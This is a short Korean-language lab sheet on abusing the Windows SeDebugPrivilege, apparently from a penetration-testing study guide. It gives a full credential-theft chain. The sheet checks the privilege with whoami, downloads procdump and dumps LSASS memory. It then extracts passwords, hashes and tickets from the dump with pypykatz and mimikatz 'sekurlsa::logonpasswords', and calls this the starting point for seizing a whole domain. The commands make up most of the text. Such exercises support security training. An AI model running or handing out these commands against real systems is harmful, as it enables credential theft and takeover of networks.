# SeDebugPrivilege — 실습

- 뜻: 디버그
- 핵심: 다른 프로세스의 메모리를 읽고 쓸 수 있다. SYSTEM 프로세스에도 디버거를 붙일 수 있다.

# 1. 특권 상태 확인

- `whoami /priv | findstr /i "SeDebug"`

# 2. 실습: SYSTEM 프로세스 찾기

- `tasklist /v | findstr /i "system"`
- `Get-Process lsass, winlogon -IncludeUserName`

# 3. 실습: LSASS 메모리 덤프 (procdump)

Local Security Authority Subsystem Service

- Sysinternals procdump 다운로드
  - `IWR https://live.sysinternals.com/procdump.exe -OutFile C:\temp\procdump.exe`
- 덤프 실행 (SeDebug가 있어야 SYSTEM 프로세스에 접근 가능)
  - `C:\temp\procdump.exe -ma lsass.exe C:\temp\lsass.dmp`
- 실패하면? → 특권이 Disabled인지 확인: `whoami /priv`
- 덤프 파일 확인
  - `Get-ChildItem C:\temp\lsass.dmp`

# 4. 실습: 덤프에서 자격 증명 추출 (Kali)

- `pypykatz lsa minidump C:\temp\lsass.dmp`
- mimikatz (Windows에서 직접)
  - `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit`

# 5. 이해 포인트

- SeDebug가 있으면 SYSTEM 프로세스 메모리를 읽을 수 있다
- LSASS에는 로그인한 사용자의 패스워드/해시/티켓이 평문 또는 복호화 가능한 형태로 있다
- 그래서 SeDebug = 사실상 자격 증명 탈취 = 도메인 전체 장악의 시작점
